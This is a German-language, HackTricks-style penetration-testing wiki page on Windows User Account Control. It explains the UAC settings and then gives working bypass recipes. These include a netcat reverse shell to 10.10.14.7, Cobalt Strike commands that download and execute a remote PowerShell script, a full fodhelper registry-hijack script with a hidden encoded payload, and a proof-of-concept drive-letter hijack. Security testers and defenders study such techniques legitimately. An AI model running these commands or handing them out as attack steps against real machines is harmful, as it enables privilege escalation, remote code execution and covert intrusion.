# UAC - Benutzerkontensteuerung (User Account Control)

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für erhöhte Aktivitäten** ermöglicht. Anwendungen haben unterschiedliche `integrity`-Level, und ein Programm mit einem **hohen Level** kann Aufgaben ausführen, die **das System potenziell kompromittieren könnten**. Wenn UAC aktiviert ist, laufen Anwendungen und Tasks standardmäßig **unter dem Sicherheitskontext eines Nicht-Administrator-Kontos**, es sei denn, ein Administrator gewährt diesen Anwendungen/Tasks explizit Administratorrechte, damit sie ausgeführt werden können. Es ist eine Komfortfunktion, die Administratoren vor unbeabsichtigten Änderungen schützt, aber nicht als Sicherheitsgrenze gilt.

Für mehr Informationen über integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wenn UAC aktiviert ist, erhält ein Administratorbenutzer zwei Token: ein Standardbenutzer-Token, um reguläre Aktionen auf normalem Level auszuführen, und eins mit den Admin-Privilegien.

Diese [Seite](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) beschreibt, wie UAC im Detail funktioniert und umfasst den Anmeldeprozess, die Benutzererfahrung und die UAC-Architektur. Administratoren können Sicherheitsrichtlinien verwenden, um zu konfigurieren, wie UAC für ihre Organisation lokal (über secpol.msc) funktioniert oder über Group Policy Objects (GPO) in einer Active Directory-Domänenumgebung konfiguriert und verteilt werden. Die verschiedenen Einstellungen sind [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ausführlich beschrieben. Es gibt 10 Group Policy-Einstellungen, die für UAC gesetzt werden können. Die folgende Tabelle liefert zusätzliche Details:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Deaktiviert                                                  |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Deaktiviert                                                  |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Aufforderung zur Zustimmung für Nicht-Windows-Binärdateien   |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Aufforderung zu Anmeldeinformationen auf dem secure desktop  |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Aktiviert (Standard für Home) Deaktiviert (Standard für Enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Deaktiviert                                                  |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Aktiviert                                                    |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Aktiviert                                                    |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Aktiviert                                                    |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Aktiviert                                                    |

### UAC Bypass Theory

Einige Programme werden **automatisch erhöht (autoelevated)**, wenn der **Benutzer** zur **Administratorgruppe gehört**. Diese Binärdateien haben in ihren _**Manifests**_ die _**autoElevate**_-Option mit dem Wert _**True**_. Die Binärdatei muss außerdem von Microsoft signiert sein.

Viele auto-elevate Prozesse bieten **Funktionalität über COM-Objekte oder RPC-Server** an, die von Prozessen mit medium integrity (normale Benutzerprivilegien) aufgerufen werden können. Beachte, dass COM (Component Object Model) und RPC (Remote Procedure Call) Methoden sind, die Windows-Programme zur Kommunikation und Ausführung von Funktionen über verschiedene Prozesse hinweg verwenden. Zum Beispiel ist **`IFileOperation COM object`** dazu gedacht, Dateioperationen (kopieren, löschen, verschieben) zu handhaben und kann automatisch Rechte erhöhen, ohne eine Aufforderung anzuzeigen.

Beachte, dass einige Prüfungen durchgeführt werden können, z. B. ob der Prozess aus dem **System32-Verzeichnis** gestartet wurde. Das lässt sich zum Beispiel umgehen, indem man **in explorer.exe** oder eine andere in System32 befindliche ausführbare Datei injiziert.

Eine andere Methode, diese Prüfungen zu umgehen, ist, die **PEB** zu **modifizieren**. Jeder Prozess in Windows hat einen Process Environment Block (PEB), der wichtige Daten über den Prozess enthält, wie z. B. seinen ausführbaren Pfad. Durch das Modifizieren des PEB können Angreifer den Standort ihres eigenen bösartigen Prozesses fälschen (spoofen), sodass er so erscheint, als würde er aus einem vertrauenswürdigen Verzeichnis (wie system32) ausgeführt. Diese gefälschten Informationen täuschen das COM-Objekt und führen dazu, dass Rechte automatisch erhöht werden, ohne den Benutzer zu fragen.

Um dann die **UAC zu umgehen** (Erhöhung von **medium** auf **high** integrity level) nutzen manche Angreifer diese Arten von Binärdateien, um **beliebigen Code auszuführen**, weil dieser aus einem Prozess mit **High integrity level** ausgeführt wird.

Du kannst das _**Manifest**_ einer Binärdatei mit dem Tool _**sigcheck.exe**_ von Sysinternals prüfen. (`sigcheck.exe -m <file>`) Und du kannst das **integrity level** der Prozesse mit **Process Explorer** oder **Process Monitor** (von Sysinternals) ansehen.

### UAC prüfen

Um zu bestätigen, ob UAC aktiviert ist, führe:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Wenn es **`1`** ist, dann ist UAC **aktiviert**, wenn es **`0`** ist oder nicht existiert, dann ist UAC **inaktiv**.

Dann überprüfe, **welches Level** konfiguriert ist:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Wenn **`0`**, dann erscheint keine UAC-Eingabeaufforderung (wie **deaktiviert**)
- Wenn **`1`**, wird der Administrator nach **Benutzername und Passwort** gefragt, um die Binärdatei mit erhöhten Rechten auszuführen (auf Secure Desktop)
- Wenn **`2`** (**Immer benachrichtigen**) wird UAC den Administrator immer um Bestätigung bitten, wenn er versucht, etwas mit erhöhten Rechten auszuführen (auf Secure Desktop)
- Wenn **`3`**, wie `1`, aber nicht auf Secure Desktop erforderlich
- Wenn **`4`**, wie `2`, aber nicht auf Secure Desktop erforderlich
- Wenn **`5`** (**Standard**), fordert es den Administrator auf, die Ausführung von Nicht-Windows-Binaries mit erhöhten Rechten zu bestätigen

Dann sollten Sie sich den Wert von **`LocalAccountTokenFilterPolicy`** ansehen\
Wenn der Wert **`0`** ist, kann nur der **RID 500** Benutzer (**built-in Administrator**) **Admin-Aufgaben ohne UAC** ausführen, und wenn er `1` ist, können **alle Konten in der Gruppe "Administrators"** dies tun.

Und schließlich schauen Sie sich den Wert des Schlüssels **`FilterAdministratorToken`** an\
Wenn **`0`** (Standard), kann das integrierte Administrator-Konto Remote-Administrationsaufgaben durchführen, und wenn **`1`**, kann das integrierte Administrator-Konto **keine** Remote-Administrationsaufgaben durchführen, es sei denn, `LocalAccountTokenFilterPolicy` ist auf `1` gesetzt.

#### Zusammenfassung

- Wenn `EnableLUA=0` oder **nicht vorhanden**, **keine UAC für niemanden**
- Wenn `EnableLua=1` und **`LocalAccountTokenFilterPolicy=1`**, keine UAC für niemanden
- Wenn `EnableLua=1` und **`LocalAccountTokenFilterPolicy=0` und `FilterAdministratorToken=0`**, keine UAC für RID 500 (Built-in Administrator)
- Wenn `EnableLua=1` und **`LocalAccountTokenFilterPolicy=0` und `FilterAdministratorToken=1`**, UAC für alle

All diese Informationen können mit dem **metasploit**-Modul gesammelt werden: `post/windows/gather/win_privs`

Sie können auch die Gruppen Ihres Benutzers überprüfen und die Integritätsstufe abfragen:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Beachte, dass, wenn du grafischen Zugriff auf das Opfer hast, UAC bypass sehr einfach ist, da du einfach auf "Yes" klicken kannst, wenn die UAC prompt erscheint

Der UAC bypass wird in der folgenden Situation benötigt: **UAC ist aktiviert, dein Prozess läuft in einem medium integrity context, und dein Benutzer gehört zur administrators group**.

Es ist wichtig zu erwähnen, dass es **viel schwerer ist, UAC zu bypassen, wenn es auf der höchsten Sicherheitsstufe (Always) steht, als in einer der anderen Stufen (Default).**

### UAC disabled

Wenn UAC bereits deaktiviert ist (`ConsentPromptBehaviorAdmin` ist **`0`**) kannst du **eine reverse shell mit admin privileges** (high integrity level) ausführen, z. B. so:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sehr** grundlegender UAC "bypass" (vollständiger Dateisystemzugriff)

Wenn du eine shell mit einem Benutzer hast, der zur Administrators-Gruppe gehört, kannst du das freigegebene **C$** per SMB (Dateisystem) lokal als neues Laufwerk einbinden und hast dann **Zugriff auf alles im Dateisystem** (sogar auf den Home-Ordner des Administrators).

> [!WARNING]
> **Sieht so aus, als würde dieser Trick nicht mehr funktionieren**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass mit cobalt strike

Die Cobalt Strike-Techniken funktionieren nur, wenn UAC nicht auf die maximale Sicherheitsstufe eingestellt ist.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** und **Metasploit** haben ebenfalls mehrere Module, um die **UAC** zu **bypass**.

### KRBUACBypass

Dokumentation und Tool unter [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) ist eine **Zusammenstellung** mehrerer UAC bypass exploits. Beachte, dass du **UACME mit visual studio oder msbuild kompilieren** musst. Die Kompilierung erzeugt mehrere ausführbare Dateien (wie `Source\Akagi\outout\x64\Debug\Akagi.exe`), du musst wissen, **welche du brauchst.**\
Du solltest **vorsichtig sein**, weil einige bypasses **andere Programme auslösen** werden, die den **Benutzer** **warnen**, dass etwas passiert.
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

Die vertrauenswürdige Binärdatei `fodhelper.exe` wird auf modernen Windows automatisch erhöht. Beim Start fragt sie den untenstehenden per-user Registry-Pfad ab, ohne das `DelegateExecute`-Verb zu validieren. Das Eintragen eines Befehls dort ermöglicht es einem Medium Integrity-Prozess (user is in Administrators), einen High Integrity-Prozess ohne UAC prompt zu starten.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell-Schritte (Payload setzen, dann auslösen):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Hinweise:
- Funktioniert, wenn der aktuelle Benutzer Mitglied der Administrators ist und das UAC-Level standardmäßig/locker ist (nicht Always Notify mit zusätzlichen Einschränkungen).
- Verwende den `sysnative` Pfad, um eine 64-bit PowerShell aus einem 32-bit Prozess auf 64-bit Windows zu starten.
- Die Payload kann jeder Befehl sein (PowerShell, cmd oder ein EXE-Pfad). Auffordernde UIs vermeiden, um unauffälliger zu bleiben.

#### More UAC bypass

**Alle** hier verwendeten Techniken, um AUC zu umgehen, **erfordern** eine **voll interaktive Shell** mit dem Opfer (eine normale nc.exe-Shell reicht nicht).

Du kannst das über eine **meterpreter** Session bekommen. Migriere zu einem **process**, dessen **Session**-Wert gleich **1** ist:

![](<../../images/image (863).png>)

(_explorer.exe_ sollte funktionieren)

### UAC Bypass with GUI

Wenn du Zugriff auf eine **GUI hast, kannst du einfach die UAC-Eingabeaufforderung akzeptieren**, wenn sie erscheint — dann brauchst du eigentlich keinen Bypass. Zugriff auf eine GUI ermöglicht also, die UAC zu umgehen.

Außerdem: wenn du eine GUI-Session bekommst, die jemand benutzt hat (z. B. via RDP), laufen dort möglicherweise **einige Tools, die als administrator ausgeführt werden**, von denen aus du z. B. **eine cmd** **als admin** direkt ausführen könntest, ohne nochmals von UAC gefragt zu werden, wie z. B. [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Das kann etwas **unauffälliger** sein.

### Noisy brute-force UAC bypass

Wenn dir Auffälligkeit egal ist, kannst du einfach **etwas wie** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) **ausführen**, das **ständig um Elevation bittet, bis der Benutzer zustimmt**.

### Your own bypass - Basic UAC bypass methodology

Wenn du dir **UACME** ansiehst, fällt auf, dass **die meisten UAC bypasses eine Dll Hijacking-Schwachstelle ausnutzen** (hauptsächlich indem die bösartige dll in _C:\Windows\System32_ geschrieben wird). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Finde ein Binary, das **autoelevate** (prüfe, dass es beim Ausführen auf einem hohen Integrity Level läuft).
2. Finde mit procmon "**NAME NOT FOUND**"-Ereignisse, die für **DLL Hijacking** anfällig sein können.
3. Wahrscheinlich musst du die DLL in einige geschützte Pfade (z. B. C:\Windows\System32) schreiben, in denen du keine Schreibrechte hast. Das kannst du umgehen mit:
1. **wusa.exe**: Windows 7, 8 und 8.1. Es erlaubt, den Inhalt einer CAB-Datei in geschützte Pfade zu extrahieren (weil dieses Tool in einem hohen Integrity Level ausgeführt wird).
2. **IFileOperation**: Windows 10.
4. Bereite ein **script** vor, das deine DLL in den geschützten Pfad kopiert und das verwundbare, autoelevated Binary ausführt.

### Another UAC bypass technique

Besteht darin zu beobachten, ob ein **autoElevated binary** versucht, aus der **registry** den **Name/Pfad** einer **binary** oder eines **command** zu **lesen**, die ausgeführt werden sollen (besonders interessant, wenn das Binary diese Information in der **HKCU** sucht).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” verwendet shadow-admin tokens mit per-session `\Sessions\0\DosDevices/<LUID>` maps. Das Verzeichnis wird lazy von `SeGetTokenDeviceMap` bei der ersten `\??`-Auflösung erstellt. Wenn der Angreifer das shadow-admin token nur bei **SecurityIdentification** impersonifiziert, wird das Verzeichnis mit dem Angreifer als **owner** erstellt (vererbt `CREATOR OWNER`), wodurch Drive-Letter-Links möglich werden, die Vorrang vor `\GLOBAL??` haben.

**Steps:**

1. Aus einer niedrig privilegierten Session `RAiProcessRunOnce` aufrufen, um ein promptloses shadow-admin `runonce.exe` zu spawnen.
2. Den primären Token zu einem **identification** Token duplizieren und diesen impersonifizieren beim Öffnen von `\??`, um die Erstellung von `\Sessions\0\DosDevices/<LUID>` unter Angreifer-Ownership zu erzwingen.
3. Einen `C:`-Symlink dort erstellen, der auf angreifer-kontrollierten Speicher zeigt; nachfolgende Dateisystemzugriffe in dieser Session lösen `C:` auf den Angreiferpfad auf und erlauben DLL-/Datei-Hijack ohne Prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referenzen
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
